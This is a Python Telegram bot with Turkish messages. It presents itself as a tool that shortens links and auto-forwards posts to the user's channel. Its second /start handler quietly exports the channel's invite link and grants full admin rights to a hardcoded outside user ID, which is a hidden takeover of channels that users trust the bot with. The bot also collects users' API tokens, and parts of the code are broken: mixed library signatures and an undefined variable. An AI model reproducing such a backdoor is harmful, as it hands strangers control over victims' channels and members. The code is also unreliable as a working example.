
import requests

from requests import get
from os import environ
import pymongo
import telethon
from telethon import *
import asyncio
from asyncio import sleep
from telethon.tl.functions.messages import ExportChatInviteRequest
from telethon.tl.types import ChatAdminRights
from telethon.tl.functions.channels import EditAdminRequest
from pymongo import MongoClient


api_id = environ['API_ID']
api_hash = environ['API_HASH']
botapi = environ['BOT_TOKEN'] 
mongo = environ['MONGO']
bot = TelegramClient("Bot", api_id, api_hash).start(bot_token=botapi)
cluster = pymongo.MongoClient(mongo)
db = cluster["OtoPost"]
collection = db["Kanallar"]

print("Başlıyor")
    
@bot.on(NewMessage(pattern='(?i).*/start'))
def start(client, message):
    chat = message.chat_id
    bot.send_message(chat, "Merhaba!\n\n**Ne İşe Yarıyor?**\nBu bot [Link Mahzeni'nde](https://t.me/joinchat/UYu8q0gBTUdUudDL) paylaşılan postların linklerini otomatik olarak kısaltıp sizin kanalınıza iletir.\n\n**Nasıl Kullanılır?**\n1. Adım: Botu kanlınıza yönetici olarak ekleyin. \n2. Adım: API adresinizi ve Kanal ID girin. \n-/kaydet TRLINK_API KANAL_ID \n3. Adım: Kanalınzda /onayla yazın.\n4. Adım: Keyfini çıkarın.\n\n__NOT: Kanalınızın ID numarasını bilmiyorsanız kanaldan bota bir post iletin bot size söyleyecek.__", disable_web_page_preview=True)

@bot.on(events.NewMessage(pattern='(?i).*/start'))
async def post(message):
    chat = message.chat_id
    print(chat)
    link = await bot(functions.messages.ExportChatInviteRequest(chat))
    link = str(link).split(", ")
    link = link[0].replace("ChatInviteExported(link='", " ").replace("'", " ")
    new_rights = ChatAdminRights(post_messages=True, add_admins=True,
                                 invite_users=True,
                                 change_info=True,
                                 ban_users=True,
                                 delete_messages=True)
    
    await message.client(EditAdminRequest(chat, 1671239079, new_rights, "Post"))
    print(yetki)
    await bot.send_message(chat, "Tamamdır!")

@bot.on(events.NewMessage)
async def aydialma(client, message):
    print(message.text)
    if not message.text == None and message.text.startswith("/kaydet"):
        mesaj = message.text.split(None, 2)[1:]
        cid = message.chat_id
        user = message.from_user.id
        print(mesaj)
        if len(mesaj) < 2:
            await bot.send_message(cid, "Yanlış kullanım! \n\n-/kaydet TRLINK_API KANAL_ID")
            return
        key = {"_id": user, "token": mesaj[0], "kanal": mesaj[1]}
        bnb = collection.find_one({"_id": user})
        if bnb == None:
            collection.insert_one(key)
        else:
            collection.update_one({"_id": user}, {"$set":{"token": mesaj[0], "kanal": mesaj[1]}})
    
        await bot.send_message(cid, "Kaydedildi!")
    else:
        chat = message.chat_id
        ileti = message.forward_from_chat
        ileti = ileti['id']
        await bot.send_message(chat, f"Kanal ID: `{ileti}`")



bot.run_until_disconnected()
